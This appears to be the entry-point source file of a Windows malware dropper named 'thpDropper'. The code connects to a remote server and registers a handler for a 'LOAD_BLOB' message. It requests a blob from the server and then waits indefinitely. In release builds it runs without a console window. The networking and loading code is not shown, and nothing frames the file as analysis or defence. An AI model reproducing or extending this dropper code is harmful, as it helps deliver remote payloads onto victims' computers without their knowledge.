// thpDropper.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "Logging.h"
#include "Globals.h"
#include "Networking.h"
#include "LoadBlobHandler.h"

#ifdef _DEBUG
int main()
#else
int CALLBACK WinMain(_In_ HINSTANCE hInstance, _In_ HINSTANCE hPrevInstance, _In_ LPSTR     lpCmdLine, _In_ int       nCmdShow)
#endif
{
	NetworkStartup();
	RegisterHandler(MESSAGE_TYPES::LOAD_BLOB, LoadBlobHandler);
	InfoLog(L"Attempting to connect");
	if (!reconnect())
	{
		return false;
	}
	StartListening();
	HEAD_PACKET packet{};
	BuildPacketAndSend(MESSAGE_TYPES::LOAD_BLOB, &packet, sizeof(packet));
	while (true);
    return 0;
}

